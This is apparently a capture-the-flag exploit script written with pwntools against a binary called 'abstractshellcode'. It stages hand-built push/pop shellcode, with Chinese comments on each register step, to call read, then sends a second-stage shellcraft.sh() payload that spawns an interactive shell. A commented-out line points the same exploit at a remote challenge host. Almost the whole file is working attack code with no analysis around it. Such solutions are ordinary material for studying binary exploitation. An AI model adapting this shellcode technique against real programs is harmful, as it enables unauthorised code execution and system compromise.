from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./abstractshellcode')
#p = remote('43.249.195.138', 21109)

shellcodemy = asm('''
push rdi    # 设置rax为0
pop rax

pop rsi     # 设置rsi指向syscall
pop rsi
pop rsi

push rax    # 设置rdi为0
pop rdi

push rsi    # 设置rsp指向shellcode
pop rsp

pop rdx     # 设置rdx为/50f作为read读取的长度
push rdx

push rsi    # 设置rsp指向shellcode
push rsi

pop rsi     # 填充shellcode使得ret为最后的字符
push rax
pop rax

ret         # 跳转到shellcode
''')

p.recvuntil('input:(ye / no)\n')
p.send(asm('syscall'))
p.recvuntil('---input your pop code---\n')

#gdb.attach(p, 'b *$rebase(0x14A6)\nc')
p.send(shellcodemy)
p.send(b'aa' + asm(shellcraft.sh()))

p.interactive()